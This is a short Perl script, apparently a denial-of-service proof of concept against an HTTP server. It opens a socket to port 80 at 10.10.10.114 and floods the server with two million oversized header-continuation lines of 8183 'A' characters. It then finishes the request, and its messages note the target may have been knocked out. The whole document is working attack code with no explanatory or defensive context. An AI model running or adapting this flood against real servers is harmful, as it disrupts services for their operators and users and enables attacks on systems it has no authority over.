use IO::Socket::INET;
 
$host="10.10.10.114";
$port=80;
$sock = IO::Socket::INET->new(PeerAddr => $host,PeerPort => $port, Proto => 'tcp') || die "new error$@\n";
binmode($sock);
$hostname="Host: $host";
$buf2='A'x50;
$buf4='A'x8183;
$len=length($buf2);
$buf="GET / HTTP/1.1\r\n";
send($sock,$buf,0) || die "send error:$@\n";
for($i= 0; $i < 2000000; $i++)
{
    $buf=" $buf4\r\n";
    send($sock,$buf,0) || die "send error:$@, target maybe have been D.o.S?\n";
}
$buf="$hostname\r\n";
$buf.="Content-Length: $len\r\n";
 
$buf.="\r\n";
$buf.=$buf2."\r\n\r\n";
 
send($sock,$buf,0) || die "send error:$@\n";
print "Ok, our buffer have send to target \n";
close($sock);
